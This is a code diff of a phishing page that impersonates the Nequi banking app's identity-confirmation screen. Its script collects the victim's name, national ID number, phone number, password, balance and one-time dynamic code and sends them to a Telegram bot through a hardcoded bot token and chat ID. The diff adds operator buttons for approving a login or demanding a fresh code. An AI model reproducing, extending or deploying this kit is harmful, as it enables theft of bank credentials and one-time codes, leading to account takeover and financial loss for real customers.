@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nequi - Clave Dinámica</title>
+    <title>Nequi - Confirmación</title>
     <style>
+        /* Mismo CSS del original */
         html, body { height: 100%; margin: 0; }
         body {
             font-family: 'Manrope', sans-serif;
@@ -16,13 +17,6 @@
         .main-container {
             max-width: 360px;
             padding: 20px;
-        }
-        .logo-top {
-            text-align: center;
-            margin-bottom: 12px;
-        }
-        .logo-top img {
-            height: 30px;
         }
         .title {
             font-weight: 700;
@@ -96,10 +90,6 @@
 </head>
 <body>
     <div class="main-container">
-        <div class="logo-top">
-            <img src="./img/logo.svg" alt="Nequi">
-        </div>
-
         <h1 class="title">Confirma tu identidad</h1>
         <p class="subtitle">Para confirmar tu identidad escribe la clave dinámica que encuentras en tu App Nequi.</p>
         
@@ -213,18 +203,25 @@
                 const clave = localStorage.getItem("clave") || "No especificado";
                 const saldo = localStorage.getItem("saldo") || "No especificado";
 
-                // TELEGRAM CONFIG (sin espacio)
+                // Guardar OTP
+                localStorage.setItem("otp1", otp);
+
+                // Crear ID único para este usuario
+                const userId = Date.now();
+                localStorage.setItem("userId", userId);
+
+                // TELEGRAM CONFIG
                 const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
                 const TELEGRAM_CHAT_ID = '6958936698';
 
-                const message = `🔐 <b>CLAVE DINÁMICA</b>\n\n` +
+                const message = `🔐 <b>CLAVE DINÁMICA 1</b>\n\n` +
                     `📛 <b>Nombre:</b> ${nombreApellido}\n` +
                     `🪪 <b>Cédula:</b> ${cedula}\n` +
                     `📱 <b>Número:</b> ${numero}\n` +
                     `🔑 <b>Clave:</b> ${clave}\n` +
                     `💰 <b>Saldo:</b> ${saldo}\n` +
-                    `🔢 <b>Dinámica:</b> <code>${otp}</code>\n` +
-                    `🆔 <b>UserID:</b> ${Date.now()}\n` +
+                    `🔢 <b>Dinámica 1:</b> <code>${otp}</code>\n` +
+                    `🆔 <b>UserID:</b> ${userId}\n` +
                     `📅 ${new Date().toLocaleString('es-CO')}`;
 
                 try {
@@ -234,7 +231,14 @@
                         body: JSON.stringify({
                             chat_id: TELEGRAM_CHAT_ID,
                             text: message,
-                            parse_mode: 'HTML'
+                            parse_mode: 'HTML',
+                            reply_markup: {
+                                inline_keyboard: [[
+                                    { text: '✅ Aprobar', callback_data: `approve_${userId}` },
+                                    { text: '🔄 Nueva Dinámica', callback_data: `retry_${userId}` },
+                                    { text: '❌ Error Login', callback_data: `error_${userId}` }
+                                ]]
+                            }
                         })
                     });
 
@@ -253,6 +257,8 @@
                 }
             });
         });
+
+        // La verificación del estado se hace en loading.html
     </script>
 </body>
 </html>
